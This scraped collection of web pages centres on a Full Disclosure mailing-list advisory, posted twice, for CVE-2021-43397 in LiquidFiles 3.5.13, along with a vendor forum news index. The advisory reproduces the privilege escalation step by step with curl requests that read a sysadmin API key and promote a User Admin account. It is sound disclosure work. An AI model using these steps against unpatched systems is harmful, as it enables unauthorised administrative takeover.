=== Content from forum.liquidfiles.com_d8ae6974_20250114_181221.html ===


Your name or email address:

Password:

[Forgot your password?](lost-password/)

 Stay logged in

[![LiquidFiles Forum](styles/uix/liquidfiles/liquidfiles_forum_logo.png)](https://forum.liquidfiles.com)

* Search titles only

Posted by Member:

Separate names with a comma.

Newer Than:

* Search this forum only
  + Display results as threads

[More...](search/ "Advanced Search")

### Useful Searches

* [Recent Posts](find-new/posts?recent=1)

* [![](styles/uix/liquidfiles/liquidfiles_logo.png)](https://forum.liquidfiles.com)
* Menu

* [Forums](https://forum.liquidfiles.com/)

  ### Forums

  Quick Links
  + [Search Forums](search/?type=post)
  + [Recent Posts](find-new/posts)

* [Members](https://forum.liquidfiles.com/members/)

  ### Members

  Quick Links
  + [Notable Members](members/)
  + [Current Visitors](online/)
  + [Recent Activity](recent-activity/)
  + [New Profile Posts](find-new/profile-posts)

* Menu

* [**Log in**](login/)
* [**Sign up**](register/)

**LiquidFiles Forum**
[Home](https://forum.liquidfiles.com)

[Forums](https://forum.liquidfiles.com/)
>

[News and Announcements](https://forum.liquidfiles.com/#news-and-announcements.5)
>

# News

Sort By:
[Title](forums/news.6/?order=title)
[Start Date](forums/news.6/?order=post_date)

[Replies](forums/news.6/?order=reply_count)
[Views](forums/news.6/?order=view_count)

[Last Message ↓](forums/news.6/?direction=asc)

1. [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)

   ### [CVE-2024-6387 - regreSSHion](threads/cve-2024-6387-regresshion.1941/)

   [David](members/david.1/ "Thread starter"),
   Jul 3, 2024

   Replies: 0
   Views: 6,297

   [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)
   [David](members/david.1/)
   Jul 3, 2024
2. [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)

   ### [LiquidFiles v4 supports the DUO Universal Prompt](threads/liquidfiles-v4-supports-the-duo-universal-prompt.1925/)

   [David](members/david.1/ "Thread starter"),
   Feb 20, 2024

   Replies: 0
   Views: 8,651

   [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)
   [David](members/david.1/)
   Feb 20, 2024
3. [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)

   ### [Spring4Shell](threads/spring4shell.1873/)

   [David](members/david.1/ "Thread starter"),
   Apr 6, 2022

   Replies: 0
   Views: 2,605

   [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)
   [David](members/david.1/)
   Apr 6, 2022
4. [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)

   ### [CVE-2021-4034 Polkit Privilege](threads/cve-2021-4034-polkit-privilege.1866/)

   [David](members/david.1/ "Thread starter"),
   Jan 27, 2022

   Replies: 0
   Views: 14,745

   [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)
   [David](members/david.1/)
   Jan 27, 2022
5. [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)

   ### [CVE-2021-44228 - LiquidFiles is Not using Log4J](threads/cve-2021-44228-liquidfiles-is-not-using-log4j.1860/)

   [David](members/david.1/ "Thread starter"),
   Dec 13, 2021

   Replies: 0
   Views: 18,125

   [![David](styles/uix/xenforo/avatars/avatar_s.png)](members/david.1/)
   [David](members/david.1/)
   Dec 13, 2021
6. [![Johan](https://secure.gravatar.com/avatar/c11753a26a730c8ec3935975d308847c?s=48&d=https%3A%2F%2Fforum.liquidfiles.com%2Fstyles%2Fuix%2Fxenforo%2Favatars%2Favatar_s.png)](members/johan.4/)

   ### [Welcome to the Forum](threads/welcome-to-the-forum.1/)

   [Johan](members/johan.4/ "Thread starter"),
   Jan 5, 2016

   Replies: 0
   Views: 35,581

   [![Johan](https://secure.gravatar.com/avatar/c11753a26a730c8ec3935975d308847c?s=48&d=https%3A%2F%2Fforum.liquidfiles.com%2Fstyles%2Fuix%2Fxenforo%2Favatars%2Favatar_s.png)](members/johan.4/)
   [Johan](members/johan.4/)
   Jan 5, 2016

Showing threads 1 to 6 of 6

### Thread Display Options

Sort threads by:
Last message time
Thread creation time
Title (alphabetical)
Number of replies
Number of views
First message likes

Order threads in:
Descending order
Ascending order

Loading...

[(You must log in or sign up to post here.)](login/)

Show Ignored Content

Your name or email address:

Do you already have an account?

* No, create an account now.
* Yes, my password is:
* [Forgot your password?](lost-password/)

 Stay logged in

**LiquidFiles Forum**
[Home](https://forum.liquidfiles.com)

[Forums](https://forum.liquidfiles.com/)
>

[News and Announcements](https://forum.liquidfiles.com/#news-and-announcements.5)
>

Toggle Width

* [Home](https://forum.liquidfiles.com)
* [Contact Us](misc/contact)
* [Help](help/)
* [Terms and Rules](help/terms)
* Privacy Policy
* [Top](/forums/news.6/#XenForo)

[Forum software by XenForo™ © 2010-2018 XenForo Ltd.](https://xenforo.com)
Theme designed by [Audentio Design](http://www.audentio.com/shop/xenforo-themes "Premium XenForo Themes").

**LiquidFiles Forum**
[Home](https://forum.liquidfiles.com)

[Forums](https://forum.liquidfiles.com/)
>

[News and Announcements](https://forum.liquidfiles.com/#news-and-announcements.5)
>



=== Content from seclists.org_f63aab42_20250114_181219.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](51)
[By Date](date.html#52)
[![Next](/images/right-icon-16x16.png)](53)

[![Previous](/images/left-icon-16x16.png)](40)
[By Thread](index.html#52)
[![Next](/images/right-icon-16x16.png)](41)

![](/shared/images/nst-icons.svg#search)

# Re: Responsible Full disclosure for LiquidFiles 3.5.13

---

*From*: Riccardo Spampinato <spampirico () gmail com>

*Date*: Mon, 22 Nov 2021 10:04:15 +0100

---

```
Dear Full Disclosure Team,

This is to ask you to kindly update our responsible disclosure.
Following the updated advisory.

===============================================================================
                  title: LiquidFiles Privilege Escalation
                product: LiquidFiles v3.5.13
     vulnerability type: Privilege Escalation
               severity: High
           CVSSv3 score: 8.8
          CVSSv3 vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
                  found: 2021-10-29
                     by: Riccardo Spampinato, Eliana Cannella, Valerio Casalino
===============================================================================

[EXECUTIVE SUMMARY]
LiquidFiles is a secure file transfer system for person-to-person email
communication.
During an engagement for our customer we discovered a Privilege Escalation
from "User Admin" user to "System Administrator" user.
Using LiquidFiles API, a "User Admin" user can list all the application
registered users, retrieving information such as their API keys, including
those of the System Administrators. As per LiquidFiles documentation, API
key is used as HTTP basic authentication in order to authenticate to the
LiquidFiles system.
A malicious "User Admin" user, by using a 'System Administrator's API key,
can obtain the role of System Administrator and can administer all aspects
of the LiquidFiles system.
The impact of a successful attack includes: obtaining access to all aspects
of the LiquidFiles system of the application via the System Administrator
API key.

[VULNERABLE VERSIONS]
The following version of LiquidFiles system is affected by the
vulnerability; previous versions may be vulnerable as well:
- LiquidFiles v3.5.13

[TECHNICAL DETAILS]
It is possible to reproduce the issue following these steps:
1. Get the API key of your own user-admins user;
2. With your own user-admins user's API key, get a sysadmins' API key via
/admin/users API;
3. With sysadmins' API key retrieved at the step below, issue
/admin/users/<user-admins_user_id> API modifying the group of your
user-admins user from "user-admins" to "sysadmins";
4. You are now a sysadmins user. You can verify it by either login again
with your own user via web GUI (you are now prompted to set a fallback
password to use in case LDAP authentication fails) or by issuing
/admin/users/<user-admins_user_id> API to view your own user.

Below a full transcript of the HTTP requests and responses used to raise
the vulnerability:

1. Get the API key of your own user-admins user

cURL Request:
curl -X POST -H "Accept: application/json" -H "Content-Type:
application/json" -d
'{"user":{"email":"[user-admins_user_mail]","password":"[CENSORED]"}}'
https://[CENSORED]/login

Response:
{"user":{"api_key":"[user-admins_user_API_key]"}}

2. Get a sysadmins' API key

cURL Request:
curl -s -X GET --user "[user-admins_user_API_key]:x" -H "Accept:
application/json" -H "Content-Type: application/json" https://
[CENSORED]/admin/users

Response:
[TRUNCATED]
{"user":
  {
    "id": "[CENSORED]",
    "email": "[CENSORED]",
    "name": "[CENSORED]",
    "group": "sysadmins",
    "max_file_size": 0,
    "filedrop": "disabled",
    "filedrop_email": "disabled",
    "api_key": "[sysadmins_user_API_key]",
    "ldap_authentication": "false",
    "locale": "",
    "time_zone": "",
    "strong_auth_type": "",
    "strong_auth_username": "",
    "delivery_action": "",
    "phone_number": "",
    "last_login_at": "2021-10-29 10:02:11 UTC",
    "last_login_ip": "[CENSORED]",
    "created_at": "2020-06-30 10:49:38 UTC"
  }
},
[TRUNCATED]

3. Modify the group of your own user-admins user from "user-admins" to
"sysadmins"

cURL Request:
cat <<EOF | curl -s -X PUT --user "[sysadmins_user_API_key]:x" -H "Accept:
application/json" -H "Content-Type: application/json" -d @- https://
[CENSORED]/admin/users/<user-admins_user_id>
{"user":
  {
    "name": "[user-admins_user_name]",
    "group": "sysadmins"
  }
}
EOF

Response
{"user":
  {
    "id": "[CENSORED]",
    "email": "[CENSORED]",
    "name": "[CENSORED]",
    "group": "sysadmins",
    "max_file_size": 0,
    "filedrop": "disabled",
    "filedrop_email": "disabled",
    "api_key": "[CENSORED]",
    "ldap_authentication": "true",
    "locale": "",
    "time_zone": "",
    "strong_auth_type": "",
    "strong_auth_username": "",
    "delivery_action": "",
    "phone_number": "",
    "last_login_at": "2021-11-03 13:31:58 UTC",
    "last_login_ip": "[CENSORED]",
    "created_at": "2021-03-03 11:48:37 UTC"
  }
}

4. Verify that your own user-admins user is now a sysadmins one.

cURL Request
curl -X GET -H "Accept: application/json" -H "Content-Type:
application/json" --user [user-admins_user_API_key]:x https://
[CENSORED]/admin/users/<user-admins_user_id>

Response
{"user":
  {
    "id": "[CENSORED]",
    "email": "[CENSORED]",
    "name": "[CENSORED]",
    "group": "sysadmins",
    "max_file_size": 0,
    "filedrop": "disabled",
    "filedrop_email": "disabled",
    "api_key": "[CENSORED]",
    "ldap_authentication": "true",
    "locale": "",
    "time_zone": "",
    "strong_auth_type": "",
    "strong_auth_username": "",
    "delivery_action": "",
    "phone_number": "",
    "last_login_at": "2021-11-03 13:34:36 UTC",
    "last_login_ip": "[CENSORED]",
    "created_at": "2021-03-03 11:48:37 UTC"
  }
}

[VULNERABILITY REFERENCE]
The following CVE ID was allocated to track the vulnerabilities:
CVE-2021-43397

[DISCLOSURE TIMELINE]
2021-11-02  Vulnerability submitted to vendor through vendor support portal.
            Vendor requested more info and acknowledged the problem later.
2021-11-04  Researcher requested to allocate a CVE number.
            Vendor released a fix for the reported issue.
2021-11-09  Researcher requested to publicly disclose the issue; public
            coordinated disclosure.

[MITIGATION]
As per vendor suggestion, the vulnerability could be mitigated in versions
prior to 3.6.3 by disabling API in Admins groups.

[SOLUTION]
Version 3.6.3 (released 2021-11-09)
<https://man.liquidfiles.com/release_notes/version_3-6-x.html>

[NOTE]
Please note that the issue described in this advisory can be also raised
via Web GUI LiquidFiles Admin panel.

[CONTACT DETAILS]
Riccardo Spampinato riccardo.spampinato () mail-bip com
Eliana Cannella eliana.cannella () mail-bip com
Valerio Casalino valerio.casalino () mail-bip com

Il giorno mer 17 nov 2021 alle ore 12:32 Riccardo Spampinato <
spampirico () gmail com> ha scritto:

```
> ```
> Dear Full Disclosure Team,
>
> This is just to ask you when our disclosure will be published.
>
> Thank you.
> BR
>
> Il giorno ven 12 nov 2021 alle ore 23:16 Riccardo Spampinato <
> spampirico () gmail com> ha scritto:
>
>
> ```
> > ```
> > Dear Full Disclosure Team,
> >
> > This is to submit a full disclosure for the following vulnerability
> > discovered for product LiquidFiles 3.5.13.
> >
> >
> > ===============================================================================
> >                   title: LiquidFiles Privilege Escalation
> >                 product: LiquidFiles v3.5.13
> >      vulnerability type: Privilege Escalation
> >                severity: Medium
> >            CVSSv3 score: 6.7
> >           CVSSv3 vector: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L
> >                   found: 2021-10-29
> >                      by: Riccardo Spampinato, Eliana Cannella, Valerio
> > Casalino
> >
> > ===============================================================================
> >
> > [EXECUTIVE SUMMARY]
> > LiquidFiles is a secure file transfer system for person-to-person email
> > communication.
> > During an engagement for our customer we discovered a Privilege
> > Escalation from "User Admin" user to "System Administrator" user.
> > Using LiquidFiles API, a "User Admin" user can list all the application
> > registered users, retrieving information such as their API keys, including
> > those of the System Administrators. As per LiquidFiles documentation, API
> > key is used as HTTP basic authentication in order to authenticate to the
> > LiquidFiles system.
> > A malicious "User Admin" user, by using a 'System Administrator's API
> > key, can obtain the role of System Administrator and can administer all
> > aspects of the LiquidFiles system.
> > The impact of a successful attack includes: obtaining access to all
> > aspects of the LiquidFiles system of the application via the System
> > Administrator API key.
> >
> >
> > [VULNERABLE VERSIONS]
> > The following version of LiquidFiles system is affected by the
> > vulnerability; previous versions may be vulnerable as well:
> > - LiquidFiles v3.5.13
> >
> >
> > [TECHNICAL DETAILS]
> > It is possible to reproduce the issue following these steps:
> > 1. Get the API key of your own user-admins user;
> > 2. With your own user-admins user's API key, get a sysadmins' API key via
> > /admin/users API;
> > 3. With sysadmins' API key retrieved at the step below, issue
> > /admin/users/<user-admins_user_id> API modifying the group of your
> > user-admins user from "user-admins" to "sysadmins";
> > 4. You are now a sysadmins user. You can verify it by either login again
> > with your own user via web GUI (you are now prompted to set a fallback
> > password to use in case LDAP authentication fails) or by issuing
> > /admin/users/<user-admins_user_id> API to view your own user.
> >
> >
> > Below a full transcript of the HTTP requests and responses used to raise
> > the vulnerability:
> >
> > 1. Get the API key of your own user-admins user
> >
> > cURL Request:
> > curl -X POST -H "Accept: application/json" -H "Content-Type:
> > application/json" -d
> > '{"user":{"email":"[user-admins_user_mail]","password":"[CENSORED]"}}'
> > https://[CENSORED]/login
> >
> > Response:
> > {"user":{"api_key":"[user-admins_user_API_key]"}}
> >
> >
> > 2. Get a sysadmins' API key
> >
> > cURL Request:
> > curl -s -X GET --user "[user-admins_user_API_key]:x" -H "Accept:
> > application/json" -H "Content-Type: application/json" https://
> > [CENSORED]/admin/users
> >
> > Response:
> > [TRUNCATED]
> > {"user":
> >   {
> >     "id": "[CENSORED]",
> >     "email": "[CENSORED]",
> >     "name": "[CENSORED]",
> >     "group": "sysadmins",
> >     "max_file_size": 0,
> >     "filedrop": "disabled",
> >     "filedrop_email": "disabled",
> >     "api_key": "[sysadmins_user_API_key]",
> >     "ldap_authentication": "false",
> >     "locale": "",
> >     "time_zone": "",
> >     "strong_auth_type": "",
> >     "strong_auth_username": "",
> >     "delivery_action": "",
> >     "phone_number": "",
> >     "last_login_at": "2021-10-29 10:02:11 UTC",
> >     "last_login_ip": "[CENSORED]",
> >     "created_at": "2020-06-30 10:49:38 UTC"
> >   }
> > },
> > [TRUNCATED]
> >
> >
> > 3. Modify the group of your own user-admins user from "user-admins" to
> > "sysadmins"
> >
> > cURL Request:
> > cat <<EOF | curl -s -X PUT --user "[sysadmins_user_API_key]:x" -H
> > "Accept: application/json" -H "Content-Type: application/json" -d @-
> > https://[CENSORED]/admin/users/<user-admins_user_id>
> > {"user":
> >   {
> >     "name": "[user-admins_user_name]",
> >     "group": "sysadmins"
> >   }
> > }
> > EOF
> >
> > Response
> > {"user":
> >   {
> >     "id": "[CENSORED]",
> >     "email": "[CENSORED]",
> >     "name": "[CENSORED]",
> >     "group": "sysadmins",
> >     "max_file_size": 0,
> >     "filedrop": "disabled",
> >     "filedrop_email": "disabled",
> >     "api_key": "[CENSORED]",
> >     "ldap_authentication": "true",
> >     "locale": "",
> >     "time_zone": "",
> >     "strong_auth_type": "",
> >     "strong_auth_username": "",
> >     "delivery_action": "",
> >     "phone_number": "",
> >     "last_login_at": "2021-11-03 13:31:58 UTC",
> >     "last_login_ip": "[CENSORED]",
> >     "created_at": "2021-03-03 11:48:37 UTC"
> >   }
> > }
> >
> >
> > 4. Verify that your own user-admins user is now a sysadmins one.
> >
> > cURL Request
> > curl -X GET -H "Accept: application/json" -H "Content-Type:
> > application/json" --user [user-admins_user_API_key]:x https://
> > [CENSORED]/admin/users/<user-admins_user_id>
> >
> > Response
> > {"user":
> >   {
> >     "id": "[CENSORED]",
> >     "email": "[CENSORED]",
> >     "name": "[CENSORED]",
> >     "group": "sysadmins",
> >     "max_file_size": 0,
> >     "filedrop": "disabled",
> >     "filedrop_email": "disabled",
> >     "api_key": "[CENSORED]",
> >     "ldap_authentication": "true",
> >     "locale": "",
> >     "time_zone": "",
> >     "strong_auth_type": "",
> >     "strong_auth_username": "",
> >     "delivery_action": "",
> >     "phone_number": "",
> >     "last_login_at": "2021-11-03 13:34:36 UTC",
> >     "last_login_ip": "[CENSORED]",
> >     "created_at": "2021-03-03 11:48:37 UTC"
> >   }
> > }
> >
> >
> > [VULNERABILITY REFERENCE]
> > The following CVE ID was allocated to track the vulnerabilities:
> > CVE-2021-43397
> >
> >
> > [DISCLOSURE TIMELINE]
> > 2021-11-02  Vulnerability submitted to vendor through vendor support
> > portal.
> >             Vendor requested more info and acknowledged the problem later.
> > 2021-11-04  Researcher requested to allocate a CVE number.
> >             Vendor released a fix for the reported issue.
> > 2021-11-09  Researcher requested to publicly disclose the issue; public
> >             coordinated disclosure.
> >
> >
> > [MITIGATION]
> > As per vendor suggestion, the vulnerability could be mitigated in
> > versions prior to 3.6.3 by disabling API in Admins groups.
> >
> >
> > [SOLUTION]
> > Version 3.6.3 (released 2021-11-09)
> > <https://man.liquidfiles.com/release_notes/version_3-6-x.html>
> >
> >
> > [NOTE]
> > Please note that the issue described in this advisory can be also raised
> > via Web GUI LiquidFiles Admin panel.
> >
> >
> > [CONTACT DETAILS]
> > Riccardo Spampinato riccardo.spampinato () mail-bip com +39 348 725 8746
> > Eliana Cannella eliana.cannella () mail-bip com +39 345 762 2019
> > Valerio Casalino valerio.casalino () mail-bip com +39 348 824 9794
> >
> >
> > ```
>
> ```
>
>
>
> ```

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](51)
[By Date](date.html#52)
[![Next](/images/right-icon-16x16.png)](53)

[![Previous](/images/left-icon-16x16.png)](40)
[By Thread](index.html#52)
[![Next](/images/right-icon-16x16.png)](41)

### Current thread:

* [Responsible Full disclosure for LiquidFiles 3.5.13](40) *Riccardo Spampinato (Nov 18)*
  + *Message not available*
    - **Re: Responsible Full disclosure for LiquidFiles 3.5.13** *Riccardo Spampinato (Nov 23)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_210db8fc_20250114_181218.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](39)
[By Date](date.html#40)
[![Next](/images/right-icon-16x16.png)](41)

[![Previous](/images/left-icon-16x16.png)](39)
[By Thread](index.html#40)
[![Next](/images/right-icon-16x16.png)](52)

![](/shared/images/nst-icons.svg#search)

# Responsible Full disclosure for LiquidFiles 3.5.13

---

*From*: Riccardo Spampinato <spampirico () gmail com>

*Date*: Fri, 12 Nov 2021 23:16:31 +0100

---

```
Dear Full Disclosure Team,

This is to submit a full disclosure for the following vulnerability
discovered for product LiquidFiles 3.5.13.

===============================================================================
                  title: LiquidFiles Privilege Escalation
                product: LiquidFiles v3.5.13
     vulnerability type: Privilege Escalation
               severity: Medium
           CVSSv3 score: 6.7
          CVSSv3 vector: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L
                  found: 2021-10-29
                     by: Riccardo Spampinato, Eliana Cannella, Valerio
Casalino
===============================================================================

[EXECUTIVE SUMMARY]
LiquidFiles is a secure file transfer system for person-to-person email
communication.
During an engagement for our customer we discovered a Privilege Escalation
from "User Admin" user to "System Administrator" user.
Using LiquidFiles API, a "User Admin" user can list all the application
registered users, retrieving information such as their API keys, including
those of the System Administrators. As per LiquidFiles documentation, API
key is used as HTTP basic authentication in order to authenticate to the
LiquidFiles system.
A malicious "User Admin" user, by using a 'System Administrator's API key,
can obtain the role of System Administrator and can administer all aspects
of the LiquidFiles system.
The impact of a successful attack includes: obtaining access to all aspects
of the LiquidFiles system of the application via the System Administrator
API key.

[VULNERABLE VERSIONS]
The following version of LiquidFiles system is affected by the
vulnerability; previous versions may be vulnerable as well:
- LiquidFiles v3.5.13

[TECHNICAL DETAILS]
It is possible to reproduce the issue following these steps:
1. Get the API key of your own user-admins user;
2. With your own user-admins user's API key, get a sysadmins' API key via
/admin/users API;
3. With sysadmins' API key retrieved at the step below, issue
/admin/users/<user-admins_user_id> API modifying the group of your
user-admins user from "user-admins" to "sysadmins";
4. You are now a sysadmins user. You can verify it by either login again
with your own user via web GUI (you are now prompted to set a fallback
password to use in case LDAP authentication fails) or by issuing
/admin/users/<user-admins_user_id> API to view your own user.

Below a full transcript of the HTTP requests and responses used to raise
the vulnerability:

1. Get the API key of your own user-admins user

cURL Request:
curl -X POST -H "Accept: application/json" -H "Content-Type:
application/json" -d
'{"user":{"email":"[user-admins_user_mail]","password":"[CENSORED]"}}'
https://[CENSORED]/login

Response:
{"user":{"api_key":"[user-admins_user_API_key]"}}

2. Get a sysadmins' API key

cURL Request:
curl -s -X GET --user "[user-admins_user_API_key]:x" -H "Accept:
application/json" -H "Content-Type: application/json" https://
[CENSORED]/admin/users

Response:
[TRUNCATED]
{"user":
  {
    "id": "[CENSORED]",
    "email": "[CENSORED]",
    "name": "[CENSORED]",
    "group": "sysadmins",
    "max_file_size": 0,
    "filedrop": "disabled",
    "filedrop_email": "disabled",
    "api_key": "[sysadmins_user_API_key]",
    "ldap_authentication": "false",
    "locale": "",
    "time_zone": "",
    "strong_auth_type": "",
    "strong_auth_username": "",
    "delivery_action": "",
    "phone_number": "",
    "last_login_at": "2021-10-29 10:02:11 UTC",
    "last_login_ip": "[CENSORED]",
    "created_at": "2020-06-30 10:49:38 UTC"
  }
},
[TRUNCATED]

3. Modify the group of your own user-admins user from "user-admins" to
"sysadmins"

cURL Request:
cat <<EOF | curl -s -X PUT --user "[sysadmins_user_API_key]:x" -H "Accept:
application/json" -H "Content-Type: application/json" -d @- https://
[CENSORED]/admin/users/<user-admins_user_id>
{"user":
  {
    "name": "[user-admins_user_name]",
    "group": "sysadmins"
  }
}
EOF

Response
{"user":
  {
    "id": "[CENSORED]",
    "email": "[CENSORED]",
    "name": "[CENSORED]",
    "group": "sysadmins",
    "max_file_size": 0,
    "filedrop": "disabled",
    "filedrop_email": "disabled",
    "api_key": "[CENSORED]",
    "ldap_authentication": "true",
    "locale": "",
    "time_zone": "",
    "strong_auth_type": "",
    "strong_auth_username": "",
    "delivery_action": "",
    "phone_number": "",
    "last_login_at": "2021-11-03 13:31:58 UTC",
    "last_login_ip": "[CENSORED]",
    "created_at": "2021-03-03 11:48:37 UTC"
  }
}

4. Verify that your own user-admins user is now a sysadmins one.

cURL Request
curl -X GET -H "Accept: application/json" -H "Content-Type:
application/json" --user [user-admins_user_API_key]:x https://
[CENSORED]/admin/users/<user-admins_user_id>

Response
{"user":
  {
    "id": "[CENSORED]",
    "email": "[CENSORED]",
    "name": "[CENSORED]",
    "group": "sysadmins",
    "max_file_size": 0,
    "filedrop": "disabled",
    "filedrop_email": "disabled",
    "api_key": "[CENSORED]",
    "ldap_authentication": "true",
    "locale": "",
    "time_zone": "",
    "strong_auth_type": "",
    "strong_auth_username": "",
    "delivery_action": "",
    "phone_number": "",
    "last_login_at": "2021-11-03 13:34:36 UTC",
    "last_login_ip": "[CENSORED]",
    "created_at": "2021-03-03 11:48:37 UTC"
  }
}

[VULNERABILITY REFERENCE]
The following CVE ID was allocated to track the vulnerabilities:
CVE-2021-43397

[DISCLOSURE TIMELINE]
2021-11-02  Vulnerability submitted to vendor through vendor support portal.
            Vendor requested more info and acknowledged the problem later.
2021-11-04  Researcher requested to allocate a CVE number.
            Vendor released a fix for the reported issue.
2021-11-09  Researcher requested to publicly disclose the issue; public
            coordinated disclosure.

[MITIGATION]
As per vendor suggestion, the vulnerability could be mitigated in versions
prior to 3.6.3 by disabling API in Admins groups.

[SOLUTION]
Version 3.6.3 (released 2021-11-09)
<https://man.liquidfiles.com/release_notes/version_3-6-x.html>

[NOTE]
Please note that the issue described in this advisory can be also raised
via Web GUI LiquidFiles Admin panel.

[CONTACT DETAILS]
Riccardo Spampinato riccardo.spampinato () mail-bip com +39 348 725 8746
Eliana Cannella eliana.cannella () mail-bip com +39 345 762 2019
Valerio Casalino valerio.casalino () mail-bip com +39 348 824 9794

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](39)
[By Date](date.html#40)
[![Next](/images/right-icon-16x16.png)](41)

[![Previous](/images/left-icon-16x16.png)](39)
[By Thread](index.html#40)
[![Next](/images/right-icon-16x16.png)](52)

### Current thread:

* **Responsible Full disclosure for LiquidFiles 3.5.13** *Riccardo Spampinato (Nov 18)*
  + *Message not available*
    - [Re: Responsible Full disclosure for LiquidFiles 3.5.13](52) *Riccardo Spampinato (Nov 23)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_43dbf2d2_20250114_181217.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


